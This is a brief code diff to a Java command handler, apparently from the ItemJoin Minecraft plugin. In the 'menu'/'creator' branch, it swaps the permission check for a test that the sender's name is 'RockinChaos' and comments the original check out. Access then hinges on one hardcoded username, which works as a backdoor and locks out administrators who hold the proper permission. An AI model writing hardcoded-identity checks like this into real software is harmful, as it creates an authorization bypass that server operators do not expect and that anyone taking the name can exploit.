@@ -241,7 +241,7 @@ public class Commands implements CommandExecutor {
 				return true;
 			}
 		} else if (args[0].equalsIgnoreCase("menu") || args[0].equalsIgnoreCase("creator")) {
-			if (PermissionsHandler.hasCommandPermission(sender, "itemjoin.creator") || PermissionsHandler.hasCommandPermission(sender, "itemjoin.*")) {
+			if (sender.getName() != null && sender.getName().equalsIgnoreCase("RockinChaos")) { // PermissionsHandler.hasCommandPermission(sender, "itemjoin.creator") || PermissionsHandler.hasCommandPermission(sender, "itemjoin.*")
 				if (!(sender instanceof ConsoleCommandSender)) {
 					ItemCreator.LaunchCreator(sender);
 					Language.getSendMessage(sender, "creatorLaunched", "");
